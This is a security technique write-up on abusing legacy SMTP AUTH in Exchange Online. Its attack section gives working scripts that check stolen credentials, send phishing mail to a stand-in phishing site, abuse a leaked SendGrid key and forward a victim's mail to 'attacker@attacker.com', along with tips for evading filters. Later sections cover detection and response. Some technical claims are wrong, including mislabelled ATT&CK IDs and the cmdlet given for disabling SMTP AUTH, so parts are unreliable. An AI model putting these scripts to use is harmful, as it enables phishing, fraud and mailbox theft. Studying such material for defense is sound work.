# [REALWORLD-002]: SMTP AUTH Legacy Protocol Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-002 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Defense Evasion / Lateral Movement |
| **Platforms** | M365 / Exchange Online |
| **Severity** | Critical |
| **Technique Status** | ACTIVE (Deprecated April 30, 2026 - Enforcement timeline active) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Exchange Online (all versions); Deadline: April 30, 2026 for 100% rejection |
| **Patched In** | Phased deprecation: 1% rejection starts March 1, 2026; 100% rejection April 30, 2026 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SMTP AUTH allows applications and mail clients to authenticate using basic credentials (username/password) to send emails through Exchange Online. Unlike modern OAuth 2.0, SMTP AUTH transmits credentials with each request and does not support Multi-Factor Authentication (MFA) enforcement, interactive login prompts, or Conditional Access policy evaluation. Attackers exploit SMTP AUTH to send phishing emails on behalf of compromised users, abuse domain reputation for spam/BEC campaigns, and establish persistent email-sending backdoors.

**Attack Surface:** SMTP AUTH is exposed at `smtp.office365.com:587` (TLS) and `smtp.office365.com:25` (SMTP relay for hybrid). Any compromised username/password can be used to send mail immediately, without triggering MFA challenges. The attack is particularly effective against:
- Accounts without MFA enforced (still 40-50% of organizations)
- Tenant policies that disable SMTP AUTH globally but do not override per-user settings
- Automated systems and legacy applications that rely on SMTP AUTH

**Business Impact:** SMTP AUTH abuse enables mass phishing campaigns impersonating compromised users, damaging organizational reputation, violating GDPR/DORA compliance, and potentially exposing sensitive communications. Unlike mailbox compromise, attackers do not need full account access – only the ability to send mail. Real-world incidents show attackers using compromised SMTP credentials to:
- Send spear-phishing emails targeting executives
- Distribute malware links to supply chain partners
- Conduct Business Email Compromise (BEC) attacks at scale
- Establish persistent backdoor access (email forwarding configured post-compromise)

**Technical Context:** SMTP AUTH has a hard deadline of **April 30, 2026**, when Microsoft will reject 100% of Basic Authentication SMTP submissions. However, until that date, organizations with legacy systems still relying on SMTP AUTH remain vulnerable. Phased deprecation begins March 1, 2026 (1% rejection rate). Attackers actively exploit this window, knowing defenders often overlook SMTP-specific audit logging.

### Operational Risk

- **Execution Risk:** **Medium** – Does not require local admin or privilege escalation; requires only valid credentials
- **Stealth:** **High** – SMTP send operations leave minimal audit trail compared to interactive logins; many organizations do not monitor `Send` operations
- **Reversibility:** **Partial** – Emails already sent cannot be recalled; mailbox forwarding rules may persist after password reset

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Microsoft 365** | 1.1.2, 2.1 | Disable basic authentication; enforce modern auth standards |
| **DISA STIG** | SI-2(3) | Information system security planning; disable deprecated protocols |
| **CISA SCuBA** | EXO.01.04 | Disable Basic Authentication for SMTP AUTH |
| **NIST 800-53** | IA-2, IA-4, SI-7 | Authentication, audit logging, enforcement of modern auth |
| **GDPR** | Art. 32, 33 | Security of processing; breach notification obligations if BEC attack occurs |
| **DORA** | Art. 9 | Protection and Prevention; critical entities must enforce modern auth |
| **NIS2** | Art. 21 | Cyber Risk Management; legacy protocols increase risk to critical infrastructure |
| **ISO 27001** | A.9.2.1, A.14.2.1 | User authentication; audit logging for all authentication events |
| **ISO 27005** | Risk Scenario | "Unauthorized Email Transmission via Compromised SMTP Credentials" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None – Valid username/password only
- **Required Access:** Network access to SMTP service endpoint (`smtp.office365.com:587` or `:25` for relay)

**Supported Versions:**
- **Exchange Online:** All versions (2019-2025)
- **SMTP Port 587 (STARTTLS):** All tenants
- **SMTP Port 25 (Relay):** Hybrid deployments only

**Prerequisites for Exploitation:**
- SMTP AUTH must not be globally disabled in tenant (`Set-OrganizationConfig -OAuth2ClientProfileEnabled $false`)
- Per-user SMTP AUTH must not be disabled (`Set-CASMailbox -SmtpClientAuthenticationDisabled:$false`)
- Attacker must have valid or compromised credentials
- MFA must not be enforced via Conditional Access targeting SMTP protocol

**Deprecation Timeline (CRITICAL):**
- **March 1, 2026:** Microsoft begins rejecting 1% of SMTP Basic Auth submissions
- **April 30, 2026:** Microsoft rejects 100% of SMTP Basic Auth submissions
- **Error Code:** `550 5.7.30 Basic authentication is not supported for Client Submission`

---

## 3. ENVIRONMENTAL RECONNAISSANCE

**Check if SMTP AUTH is enabled at tenant level:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Check tenant-wide SMTP AUTH settings
Get-OrganizationConfig | Select-Object OAuth2ClientProfileEnabled

# Check authentication policy settings
Get-AuthenticationPolicy | Select-Object Name, AllowBasicAuthSmtp

# Check if SMTP AUTH is globally disabled
Get-TransportRule | Where-Object { $_.Name -like "*SMTP*" }
```

**What to Look For:**
- `OAuth2ClientProfileEnabled: $false` – OAuth 2.0 is NOT enforced; legacy auth is allowed
- `AllowBasicAuthSmtp: $true` – SMTP AUTH via basic credentials is explicitly enabled
- No transport rules blocking SMTP AUTH – Attacker has unrestricted SMTP access

**Check for users with SMTP AUTH enabled (per-mailbox):**

```powershell
# Get all mailboxes with SMTP enabled
Get-CASMailbox -Filter { SmtpClientAuthenticationDisabled -eq $false } | 
  Select-Object UserPrincipalName, SmtpClientAuthenticationDisabled | 
  Measure-Object

# If count > 0, SMTP AUTH is enabled for those users
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct SMTP AUTH via Python/Bash (Port 587 - STARTTLS)

**Supported Versions:** Exchange Online (all versions until April 30, 2026)

#### Step 1: Test SMTP Connectivity & Authentication

**Python Script (smtplib):**

```python
#!/usr/bin/env python3
import smtplib
import sys

def test_smtp_auth(username, password, smtp_host="smtp.office365.com", smtp_port=587):
    """
    Test SMTP AUTH against Exchange Online
    Returns: True if authenticated successfully, False otherwise
    """
    try:
        # Create SMTP connection
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        
        # Enable TLS encryption
        server.starttls()
        
        # Attempt basic auth
        server.login(username, password)
        print(f"[+] SMTP AUTH SUCCESS: {username}")
        
        server.quit()
        return True
    
    except smtplib.SMTPAuthenticationError as e:
        print(f"[-] SMTP AUTH FAILED: Invalid credentials")
        return False
    
    except smtplib.SMTPException as e:
        print(f"[!] SMTP Error: {e}")
        return False
    
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return False

# Test credentials
username = "victim@company.onmicrosoft.com"
password = "CompromisedPassword123"

result = test_smtp_auth(username, password)
if result:
    print("[+] Account is vulnerable to SMTP AUTH abuse")
else:
    print("[-] SMTP AUTH enforcement detected")
```

**Bash Alternative (Telnet/OpenSSL):**

```bash
#!/bin/bash
# Test SMTP AUTH via command line

SMTP_HOST="smtp.office365.com"
SMTP_PORT="587"
USERNAME="victim@company.onmicrosoft.com"
PASSWORD="CompromisedPassword123"

# Use openssl to test SMTP AUTH
(
  sleep 2
  echo "EHLO outlook.office365.com"
  sleep 1
  echo "STARTTLS"
  sleep 2
  echo "AUTH LOGIN"
  sleep 1
  echo "$(echo -n $USERNAME | base64)"
  sleep 1
  echo "$(echo -n $PASSWORD | base64)"
  sleep 2
  echo "QUIT"
) | openssl s_client -starttls smtp -connect $SMTP_HOST:$SMTP_PORT -quiet

# Expected output on success: "235 2.7.0 Authentication Successful"
```

**Expected Output (Success):**
```
235 2.7.0 Authentication Successful
```

**What This Means:**
- Attacker has confirmed valid credentials
- SMTP AUTH is enabled on the account
- Attacker can now send mail on behalf of this user
- MFA did NOT block the connection

---

#### Step 2: Send Email via SMTP AUTH

**Python Script (Send Phishing Email):**

```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_phishing_email(sender_user, password, target_email, subject, body_html):
    """
    Send HTML phishing email via SMTP AUTH
    """
    try:
        # Create SMTP connection
        server = smtplib.SMTP("smtp.office365.com", 587, timeout=10)
        server.starttls()
        server.login(sender_user, password)
        
        # Create message
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = sender_user
        msg["To"] = target_email
        
        # Add HTML body
        part = MIMEText(body_html, "html")
        msg.attach(part)
        
        # Send email
        server.sendmail(sender_user, target_email, msg.as_string())
        print(f"[+] Email sent successfully to {target_email}")
        
        server.quit()
        return True
    
    except Exception as e:
        print(f"[-] Error sending email: {e}")
        return False

# Phishing email example
sender = "victim@company.onmicrosoft.com"
password = "CompromisedPassword123"
target = "executive@targetcompany.com"
subject = "Urgent: Action Required - Account Security Update"
body = """
<html>
<body>
<p>Hello,</p>
<p>Due to recent security updates, we require you to <b>verify your credentials</b> immediately.</p>
<p><a href="https://attacker-phishing-site.com/verify?token=abc123">Click here to verify</a></p>
<p>Microsoft Security Team</p>
</body>
</html>
"""

send_phishing_email(sender, password, target, subject, body)
```

**Expected Output (Success):**
```
[+] Email sent successfully to executive@targetcompany.com
```

**What This Means:**
- Email appears to come from compromised user's address (`victim@company.onmicrosoft.com`)
- Target sees legitimate company domain in sender address
- If victim is an executive/trusted contact, success rate of phishing increases dramatically
- Email bypasses most Conditional Access policies (SMTP protocol not protected)

**OpSec & Evasion:**
- Vary subject lines and body content to avoid mail filtering
- Use sender display name similar to legitimate company communications
- Include legitimate company logos (harvest from public sources)
- Test malicious links on sandbox first (e.g., VirusTotal)
- Space emails across time to avoid bulk send detection

---

#### Step 3: Configure Mail Forwarding (Persistent Access)

**Objective:** Establish persistent email monitoring after compromise

**PowerShell (Post-Compromise, using stolen credentials):**

```powershell
# Post-compromise: Configure email forwarding to attacker-controlled mailbox
# This requires prior mailbox compromise (via IMAP/POP as shown in REALWORLD-001)

# Forward all victim's incoming mail to attacker
Set-Mailbox -Identity "victim@company.onmicrosoft.com" -ForwardingAddress "attacker@attacker.com" -DeliverToMailboxAndForward $true

# Victim still receives copy, so they don't notice
# BUT attacker sees all incoming mail in real-time
```

**Manual (If attacker has web access via stolen session):**

1. Log into Outlook Web Access (OWA) at `outlook.office365.com`
2. Click **Settings** (gear icon) → **Mail** → **Forwarding**
3. Enter attacker's email address: `attacker@attacker.com`
4. Select **Keep a copy of forwarded messages** (avoid detection)
5. Click **Save**

**What This Means:**
- Attacker receives copy of ALL incoming mail in real-time
- Can monitor executive communications, sensitive deals, credentials shared via email
- Victim may not notice (especially if "Keep a copy" is enabled)
- Forwarding rule is permanent until manually removed

---

### METHOD 2: Impacket SMTP Relay Attack (Linux/Python)

**Supported Versions:** Hybrid deployments with SMTP relay enabled on port 25

**Objective:** Use compromised credentials to relay mail through on-premises Exchange

**Python Script (Impacket smbclient + SMTP):**

```python
#!/usr/bin/env python3
from impacket.smbconnection import SMBConnection
import smtplib
from email.mime.text import MIMEText

def smtp_relay_attack(target_exchange_server, username, password, from_addr, to_addr, subject, body):
    """
    SMTP relay via hybrid Exchange (port 25, no TLS)
    """
    try:
        # Connect to on-premises Exchange via SMTP relay (port 25)
        server = smtplib.SMTP(target_exchange_server, 25, timeout=10)
        
        # Note: Port 25 is OPEN RELAY - no auth required if within network
        # Attacker must have network access (VPN, compromised internal device, etc.)
        
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = from_addr
        msg["To"] = to_addr
        
        # Send mail through internal relay
        server.sendmail(from_addr, to_addr, msg.as_string())
        print(f"[+] Mail relayed through {target_exchange_server}")
        
        server.quit()
        return True
    
    except Exception as e:
        print(f"[-] Relay error: {e}")
        return False

# Example: Compromise Exchange server, then use internal relay
smtp_relay_attack(
    "internal-exchange.company.local",
    "victim@company.com",
    "password",
    "ceo@company.com",
    "competitor@external.com",
    "M&A Opportunity Discussion",
    "Confidential business proposal..."
)
```

**What This Means:**
- Attacker exploits SMTP relay on port 25 (no authentication required on internal network)
- Mail appears to come from internal company domain
- No audit trail if port 25 traffic is not monitored
- Particularly dangerous for social engineering attacks

---

### METHOD 3: SendGrid/Third-Party SMTP Gateway (SaaS Abuse)

**Supported Versions:** Hybrid/Cloud deployments using third-party SMTP relays

**Scenario:** Compromised user credentials stored in SendGrid, Mailgun, or similar service

**Python Script (SendGrid API Example):**

```python
#!/usr/bin/env python3
import sendgrid
from sendgrid.helpers.mail import Mail, Email, To, Content

def send_via_sendgrid(api_key, from_email, to_email, subject, html_content):
    """
    Send email via compromised SendGrid API key
    (Attacker found API key in user's scripts or environment variables)
    """
    try:
        sg = sendgrid.SendGridAPIClient(api_key)
        
        mail = Mail(
            from_email=Email(from_email),
            to_emails=To(to_email),
            subject=subject,
            html_content=Content("text/html", html_content)
        )
        
        response = sg.send(mail)
        print(f"[+] Email sent via SendGrid (Status {response.status_code})")
        return True
    
    except Exception as e:
        print(f"[-] SendGrid error: {e}")
        return False

# Attacker found SendGrid API key in user's Python script
api_key = "SG.3kj4hd8j2k3h9d2j3h2kj3h2k3h2"
from_email = "noreply@company.com"
to_email = "executive@targetcompany.com"

send_via_sendgrid(
    api_key,
    from_email,
    to_email,
    "Urgent Account Verification",
    "<p>Please verify your account: <a href='https://malicious.com'>Verify Now</a></p>"
)
```

**What This Means:**
- Third-party SaaS services often store SMTP credentials in plaintext
- Compromised API keys give attacker unlimited send capacity
- Difficult to trace; appears as legitimate SendGrid service
- No MFA enforcement at third-party level

---

## 5. MICROSOFT SENTINEL DETECTION

### Query 1: Abnormal Bulk Email Sends via SMTP AUTH

**Rule Configuration:**
- **Required Table:** `MailboxEvents` (Unified Audit Log)
- **Required Fields:** `Operation`, `ClientIP`, `UserId`, `OperationCount`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To:** All M365 tenants

**KQL Query:**

```kusto
MailboxEvents
| where TimeGenerated > ago(5m)
| where Operation in ("Send", "SendAs")
| where ResultStatus == "Success"
| summarize 
    EmailCount = count(),
    UniqueRecipients = dcount(RecipientAddress),
    FirstEmail = min(TimeGenerated),
    LastEmail = max(TimeGenerated)
    by UserId, ClientIP, ClientInfoString
| where EmailCount > 50  // Abnormal send volume
| project UserId, ClientIP, ClientInfoString, EmailCount, UniqueRecipients
| sort by EmailCount desc
```

**What This Detects:**
- Bulk email sends from single user (potential spam/BEC campaign)
- Unusual client IP for sending (not user's normal location)
- High-volume sends in short timeframe (100+ emails in 5 minutes)
- Sends from legacy SMTP clients (indicated in ClientInfoString)

**Manual Configuration (Azure Portal):**

1. Navigate to **Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Name:** `Abnormal Bulk Email Sends via SMTP`
3. **Paste KQL query** above
4. **Run every:** `5 minutes`
5. **Lookup data from the last:** `30 minutes`
6. **Create incidents:** `Yes`
7. Click **Create**

---

### Query 2: SMTP AUTH from High-Risk Countries

**KQL Query:**

```kusto
MailboxEvents
| where TimeGenerated > ago(1h)
| where Operation == "Send"
| where ClientIP in (dynamic("RiskyCountryIPs"))  // List of high-risk country IP ranges
| summarize 
    SendCount = count(),
    TargetDomains = make_set(RecipientAddress)
    by UserId, ClientIP, tostring(ClientIP)
| project UserId, ClientIP, SendCount, TargetDomains
| where SendCount > 5
```

**Manual Configuration (PowerShell):**

```powershell
# Create alert for SMTP sends from unusual locations
$ruleName = "SMTP AUTH from High-Risk Countries"
$query = @"
MailboxEvents
| where Operation == "Send"
| where ClientIP in ("123.45.67.0/24", "210.55.87.0/24")  // Replace with actual IP ranges
| summarize count() by UserId
"@

New-AzSentinelAlertRule -ResourceGroupName "MyResourceGroup" `
  -WorkspaceName "MySentinelWorkspace" `
  -DisplayName $ruleName `
  -Query $query `
  -Severity "High" `
  -Enabled $true
```

---

## 6. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon)**

- **Log Source:** Security (on-premises Exchange Server)
- **Trigger:** SMTP AUTH logon from external IP
- **Filter:** `LogonType = 10` (RemoteInteractive), `LogonProcessName = "Negotiate", Source IP not in whitelist`
- **Applies To Versions:** Exchange Server 2016-2022

**Manual Configuration (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy** → **Audit Policies** → **Logon/Logoff**
3. Enable: **Audit Logon**: `Success and Failure`
4. Run `gpupdate /force`

---

## 7. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Email Send Operation

**Alert Name:** `Suspicious bulk email send detected`

- **Severity:** High
- **Description:** User account sending abnormal volume of emails via legacy protocol
- **Remediation:** 
  1. Disable SMTP AUTH for compromised user
  2. Reset password
  3. Review forwarding rules
  4. Check mailbox delegates

**Manual Configuration:**

1. Go to **Azure Portal** → **Microsoft Defender for Cloud** → **Security alerts**
2. Review `Suspicious email send` alerts
3. Click alert → **Investigate** → Check `UserId`, `ClientIP`, `SendCount`
4. Click **Take Action** → **Disable user** (temporary suspension)

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable SMTP AUTH Globally (Phased by April 30, 2026)**

**Manual Steps (Microsoft 365 Admin Center):**

1. Go to **Microsoft 365 Admin Center** (`admin.microsoft.com`)
2. Navigate to **Settings** → **Org settings** → **Modern Authentication**
3. Uncheck **Allow Basic Authentication - SMTP AUTH**
4. Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Disable SMTP AUTH globally for all users
Get-Mailbox | Set-CASMailbox -SmtpClientAuthenticationDisabled $true

# Create authentication policy to enforce
New-AuthenticationPolicy -Name "DisableSMTPAuth" -AllowBasicAuthSmtp:$false

# Apply policy to all users
Get-User | Set-AuthenticationPolicyAssignment -AuthenticationPolicy "DisableSMTPAuth" -Force
```

**Validation Command:**

```powershell
# Verify SMTP AUTH is disabled
Get-CASMailbox | Where-Object { $_.SmtpClientAuthenticationDisabled -eq $false } | Measure-Object
# Should return: Count: 0
```

---

**Action 2: Migrate Legacy Applications to OAuth 2.0**

Microsoft provides OAuth 2.0 authentication for SMTP/IMAP/POP (XOAUTH2 protocol):

**For Third-Party Tools:**

```powershell
# Test XOAUTH2 SMTP connection (example with Python)
# pip install office365-rest-python-client

from office365.client_credentials import ClientCredential
from office365.client_credential_auth_provider import ClientCredentialAuthProvider
from office365.graph_client import GraphClient

# OAuth 2.0 authentication flow
credential = ClientCredential(client_id="YOUR_CLIENT_ID", client_secret="YOUR_SECRET")
auth_provider = ClientCredentialAuthProvider(credential)
client = GraphClient(auth_provider)

# Now use Graph API instead of SMTP AUTH
```

**For Automated Email Sending:**

Use **Azure Communication Services Email** (recommended by Microsoft):

```powershell
# Deploy Azure Communication Services
$acs = New-AzCommunicationService -ResourceGroupName "MyRG" -Name "myeMailService"

# Send email via Azure SDK (OAuth 2.0)
# No plaintext credentials required
```

---

**Action 3: Implement Conditional Access to Block Legacy SMTP**

**Manual Steps (Azure Portal):**

1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy SMTP`
4. **Assignments:**
   - **Users:** `All users`
   - **Cloud apps:** `Office 365 Exchange Online`
5. **Conditions:**
   - **Client apps:** `Mobile apps and desktop clients`, `Other clients`
6. **Access controls:**
   - **Grant:** `Block access`
7. **Enable policy:** `On`
8. Click **Create**

---

**Action 4: Enforce MFA Organization-Wide**

Combines MFA + modern auth to provide layered defense:

```powershell
# Create Conditional Access policy requiring MFA
$policy = @{
    "displayName" = "Require MFA for All Users"
    "conditions" = @{
        "users" = @{ "includeUsers" = @("All") }
        "applications" = @{ "includeApplications" = @("All") }
        "clientAppTypes" = @("all")
    }
    "grantControls" = @{
        "operator" = "OR"
        "builtInControls" = @("mfa")
    }
    "state" = "on"
}

# Note: Use MgGraph PowerShell to create this
```

---

### Priority 2: HIGH

**Action 1: Monitor SMTP AUTH Usage (Audit Logging)**

```powershell
# Enable detailed audit logging for SMTP operations
Set-OrganizationConfig -AuditDisabled $false

# Search for all SMTP AUTH sends in past 30 days
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -EndDate (Get-Date) `
  -Operations "Send" `
  -Filter @{"ClientInfoString" = "*SMTP*"} | 
  Select-Object UserIds, CreationDate, SourceIPAddress, AuditData | 
  Export-Csv -Path "smtp_sends.csv"
```

---

**Action 2: Configure Email Transport Rules**

```powershell
# Create rule: Reject emails from SMTP AUTH if sender has MFA enabled
New-TransportRule -Name "Block SMTP for MFA Users" `
  -FromScope "InOrganization" `
  -SetSCL 9  # Spam score (9 = reject)
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Unified Audit Log (Exchange Online):**
- `Operation: "Send"` from external IP address
- `ClientInfoString` contains `"SMTP"` or `"Hub Transport"`
- `IsClientSubmission: true` in audit data blob
- High `RecipientCount` (100+) in single operation
- Unusual `SenderAddress` (compromised account sending to external domains)
- Rapid succession of sends (1,000+ emails in 1 hour)

**Entra ID Sign-In Logs:**
- Sign-in from residential proxy / VPN IP
- `ClientAppUsed: "SMTP"`
- `ResultType: 0` (Success) with no MFA challenge indicated
- `ConditionalAccessStatus: notApplied` (legacy protocol bypasses CA)

---

### Forensic Artifacts

**Cloud (M365):**
- Unified Audit Log: `MailboxEvents` table (90-day retention)
- Exchange Online message trace: `Get-MessageTrace` (10-day retention)
- Mail forwarding rules: `Get-InboxRule`
- Mailbox delegates: `Get-MailboxPermission`

**Command to Collect Evidence:**

```powershell
# Export all SMTP sends for compromised user (past 30 days)
Search-UnifiedAuditLog -UserIds "victim@company.com" `
  -StartDate (Get-Date).AddDays(-30) `
  -Operations "Send" | 
  Export-Csv -Path "C:\Evidence\smtp_activity.csv"

# Export all mail forwarding rules on victim's mailbox
Get-InboxRule -Mailbox "victim@company.com" | 
  Where-Object { $_.ForwardTo -ne $null } | 
  Export-Csv -Path "C:\Evidence\forwarding_rules.csv"

# Export message trace (who sent what to whom)
Get-MessageTrace -SenderAddress "victim@company.com" `
  -StartDate (Get-Date).AddDays(-10) `
  -EndDate (Get-Date) | 
  Export-Csv -Path "C:\Evidence\message_trace.csv"
```

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable SMTP AUTH for compromised user immediately
Set-CASMailbox -Identity "victim@company.onmicrosoft.com" -SmtpClientAuthenticationDisabled $true

# Disable user account
Disable-AzureADUser -ObjectId "user@company.onmicrosoft.com"

# Force sign-out of all sessions
Revoke-AzureADUserAllRefreshToken -ObjectId "user@company.onmicrosoft.com"

# Reset password (force re-authentication)
$SecurePassword = ConvertTo-SecureString -AsPlainText "NewComplexP@ss123!" -Force
Set-AzureADUserPassword -ObjectId "user@company.onmicrosoft.com" -Password $SecurePassword
```

---

**2. Collect Evidence:**

```powershell
# Export SMTP send history
Search-UnifiedAuditLog -UserIds "victim@company.com" `
  -StartDate (Get-Date).AddDays(-30) `
  -Operations "Send" -ResultSize 5000 | 
  Export-Csv -Path "smtp_sends.csv"

# Check message trace for bulk sends
Get-MessageTrace -SenderAddress "victim@company.com" `
  -StartDate (Get-Date).AddDays(-10) | 
  Where-Object { $_.RecipientAddress -like "*@external.com" } | 
  Export-Csv -Path "external_messages.csv"

# Identify compromised domains used in phishing
$inbound = Import-Csv "external_messages.csv"
$inbound | Group-Object -Property RecipientAddress | 
  Where-Object { $_.Count -gt 10 } | 
  Select-Object Name, Count
```

---

**3. Remediate:**

```powershell
# Remove mail forwarding
Set-Mailbox -Identity "victim@company.onmicrosoft.com" -ForwardingAddress $null -DeliverToMailboxAndForward $false

# Remove malicious delegates
Remove-MailboxPermission -Identity "victim@company.onmicrosoft.com" -User "attacker@external.com" -AccessRights FullAccess -Confirm:$false

# Remove calendar sharing to external users
Remove-MailboxFolderPermission -Identity "victim@company.onmicrosoft.com:\Calendar" -User "attacker@external.com" -Confirm:$false
```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | T1566 (Phishing) | Attacker obtains credentials via phishing email |
| **2** | **Credential Access** | **[REALWORLD-002] SMTP AUTH Abuse** | **Attacker uses credentials to authenticate via SMTP** |
| **3** | **Lateral Movement** | T1534 (Internal Spearphishing) | Attacker sends phishing emails impersonating victim |
| **4** | **Persistence** | T1040 (Mailbox Forwarding) | Attacker configures email forwarding for persistent access |
| **5** | **Collection** | T1114 (Email Collection) | Attacker monitors incoming mail via forwarding rule |
| **6** | **Impact** | T1020 (Data Staged) | Attacker exfiltrates sensitive communications |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Mass Phishing Campaign (2025)

- **Vector:** Compromised Office 365 account via password spray
- **SMTP AUTH Usage:** Attacker sent 5,000+ phishing emails to supply chain partners
- **Duration:** 3 weeks before detection
- **Impact:** 15% click-through rate on phishing links; 3 secondary compromises
- **Detection Trigger:** Bulk send operation alert (1,000+ emails in 2 hours from unusual IP)
- **Key Indicator:** `ClientInfoString` contained `"SMTP"` and sender IP was in Nigeria

### Example 2: Business Email Compromise (BEC) Attack

- **Target:** Finance department executive
- **Attack Flow:**
  1. Phishing email → Compromised executive account password
  2. SMTP AUTH used to send wire transfer requests to vendors
  3. Email forwarding configured to monitor victim's mailbox
  4. Victim receives out-of-office during attack; doesn't notice spoofed emails
- **Impact:** $500K fraudulent wire transfer
- **Detection Failure:** No audit logging on SMTP sends; forwarding rule not reviewed for 6 months

### Example 3: Ransomware Distribution via SMTP

- **Vector:** Compromised contractor account with SMTP AUTH enabled
- **Campaign:** Contractor sent malicious attachments to 50+ client organizations
- **Timeline:** 2-week campaign; detected when multiple clients reported receiving suspicious emails
- **Root Cause:** Contractor's account had MFA disabled; SMTP AUTH not enforced; no audit logging
- **Mitigation Failure:** Organization had Conditional Access policies, but did not target SMTP protocol

---

## Summary & Mitigation Roadmap

**SMTP AUTH Deprecation Timeline:**

| Date | Action |
|---|---|
| **Now - Feb 28, 2026** | Migrate legacy applications to OAuth 2.0; disable SMTP AUTH where possible |
| **March 1, 2026** | Microsoft begins rejecting 1% of SMTP Basic Auth submissions |
| **March - April 2026** | Test and validate OAuth migration in production |
| **April 30, 2026** | Microsoft rejects 100% of SMTP Basic Auth; legacy applications will fail |

**Immediate Actions (Next 30 Days):**
1. **Disable SMTP AUTH** for all users who do not require it
2. **Audit SMTP usage:** Export and review all SMTP sends from past 90 days
3. **Migrate applications:** Identify and update legacy tools using SMTP AUTH
4. **Enforce Conditional Access:** Block legacy SMTP clients
5. **Enable MFA:** Organization-wide MFA enforcement with no exceptions

**Medium-Term (30-90 Days):**
1. **Complete OAuth 2.0 migration** for all applications
2. **Remove SMTP AUTH authentication policies** entirely
3. **Test failover** scenarios for critical email systems
4. **Train users** on modern authentication and phishing prevention

**Long-Term (90+ Days):**
1. **Monitor for SMTP AUTH attempts** post-April 30, 2026 (should be zero)
2. **Decommission legacy SMTP infrastructure**
3. **Maintain audit logging** for all email operations
4. **Quarterly reviews** of authorization policies and Conditional Access

Organizations that fail to migrate by April 30, 2026 will experience complete email outage for affected systems. There are no extensions or workarounds – this is Microsoft's final deadline.

---
